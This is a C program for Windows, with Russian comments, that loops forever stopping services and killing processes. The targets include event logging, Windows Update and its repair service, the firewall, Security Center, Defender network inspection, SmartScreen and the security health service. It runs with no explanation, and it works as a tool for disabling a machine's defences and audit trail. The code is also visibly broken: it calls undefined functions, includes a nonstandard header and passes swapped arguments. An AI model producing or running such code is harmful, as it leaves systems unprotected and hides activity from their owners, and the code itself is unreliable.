#include <stdio.h>
#include <stdlib.h>
#include <dir.h>
#include <dirent.h>
#include <winsock2.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <char.h>

byte CloseService = 0;
byte CloseProcessess = 0;

/* Служебные функции */

void Kill_Process(const char *Process_name) {
    HANDLE Procesess = CreateToolhelp32Snapshot(0x00000002, TH32CS_SNAPALL);
    PROCESSENTRY32 Info_Process;

    SetZeroMemory(&Info_Process, sizeof(Info_Process));
    Info_Process.dwSize = sizeof(Info_Process);

    Process32First(Procesess, &Info_Process);

    if (cmp(Info_Process.szExeFile, Process_name)) {
        HANDLE Kill = OpenProcess(0x0001, 0, Info_Process.th32ProcessID);
        TerminateProcess(Kill, -1);

        CloseHandle(Kill);
    }

    while (Process32Next(Procesess, &Info_Process)) {
        if (cmp(Info_Process.szExeFile, Process_name)) {
            HANDLE Kill = OpenProcess(0x0001, 0, Info_Process.th32ProcessID);
            TerminateProcess(Kill, -1);

            CloseHandle(Kill);
        }
    }
	
	CloseHandle(Procesess);
}

DWORD Process32Search(const char *NameProcess) {
	HANDLE Procesess = CreateToolhelp32Snapshot(0x00000002, TH32CS_SNAPALL);
    PROCESSENTRY32 Info_Process;

    SetZeroMemory(&Info_Process, sizeof(Info_Process));
    Info_Process.dwSize = sizeof(Info_Process);

    Process32First(Procesess, &Info_Process);

    if (cmp(Info_Process.szExeFile, NameProcess)) {
		CloseHandle(Procesess);
		return Info_Process.th32ProcessID;
    }

    while (Process32Next(Procesess, &Info_Process)) {
        if (cmp(Info_Process.szExeFile, NameProcess)) {
			CloseHandle(Procesess);
			return Info_Process.th32ProcessID;
        }
    }
	
	CloseHandle(Procesess);
	return -1;
}


/*******************************************/


void Killing(SC_HANDLE scm_manager) {
    const char *ServicesForStop[] = {"wuauserv\0", "EventLog\0", "XboxGipSvc\0", "TrkWks\0", "BcastDVRUserService_913dd\0", "vmicvmsession\0", "WaaSMedicSvc\0", "vmickvpexchange\0", "vmictimesync\0", "XblGameSave\0", "BITS\0", "YandexBrowserService\0", "mpssvc\0", "wscsvc\0", "gupdate\0", "gupdatem\0"};
	byte SizeList_Svc = sizeof(ServicesForStop) / sizeof(*ServicesForStop);
	
	if ((CloseService + 1) == SizeList_Svc) CloseService = 0;
	else ++CloseService;
	
	SERVICE_STATUS StatusService;
	
	SC_HANDLE Service = OpenServiceA(scm_manager, ServicesForStop[CloseService], 0x0020);
    ControlService(Service, 0x00000001, &StatusService);
    CloseServiceHandle(Service);
	
	
    Sleep(5);
}

void Killing_Process(void) {
    const char *process_list[] = {"PhoneExperienceHost.exe\0", "SearchApp.exe\0", "TextInputHost.exe\0", "MicrosoftEdgeUpdate.exe\0", "YourPhone.exe\0", "service_update.exe\0", "smartscreen.exe\0", "RuntimeBroker.exe\0", "GameBar.exe\0", "GameBarFTServer.exe\0", "GameBarPresenceWriter.exe\0", "CompatTelRunner.exe\0", "PnkBstrA.exe\0", "PnkBstrB.exe\0", "ApplicationFrameHost.exe\0", "SecurityHealthService.exe\0", "UserOOBEBroker.exe\0", "OneDriveStandaloneUpdater.exe\0", "NisSrv.exe\0", "MpCopyAccelerator.exe\0", "FileCoAuth.exe\0", "GoogleUpdate.exe\0"};	
	byte SizeList_Proc = sizeof(process_list) / sizeof(*process_list);
	
	if ((CloseProcessess + 1) == SizeList_Proc) CloseProcessess = 0;
	else ++CloseProcessess;
	
	Kill_Process(process_list[CloseProcessess]);

    Sleep(500);
}
	
int main(void) {
    HANDLE service_stop_manager = OpenSCManagerA(0, 0, 0x0001);
    
	while (1) {
        Killing(service_stop_manager);
        Killing_Process();
    }

    return 0;
}